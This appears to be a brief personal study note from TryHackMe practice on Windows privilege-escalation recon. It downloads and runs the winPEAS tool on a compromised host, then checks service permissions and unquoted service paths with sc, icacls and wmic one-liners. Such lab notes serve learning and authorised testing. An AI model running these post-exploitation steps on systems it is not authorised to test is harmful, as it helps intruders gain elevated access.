# winPEAS - Windows Privilege Escalation Recon
#pentest/tryhackme

## What
[privilege-escalation-awesome-scripts-suite/winPEAS at master · carlospolop/privilege-escalation-awesome-scripts-suite · GitHub](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## How? 
Once inside the windows target machine we can:

1. `powershell -c wget "<url>/winPEAS.exe" -outfile winPEAS.exe`
2. `winPEAS.exe`
3. This will provide a list of misconfigured services
4. What now? Let’s find out if we have permissions to change whatever we need:
	1. `sc qc <service_name>` -> Provide information about the service
	2. `icalcs "<service_name>"` -> Get list of users with permission to run the service

## How do I manually list services running?
`powershell -c "Get-Service"`

- - - -

Alternatives to winPEAS when we want to check for `Unquoted Service Paths` misconfigurations. We can run:
* `wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "C:\windows\\" |findstr /i /v """`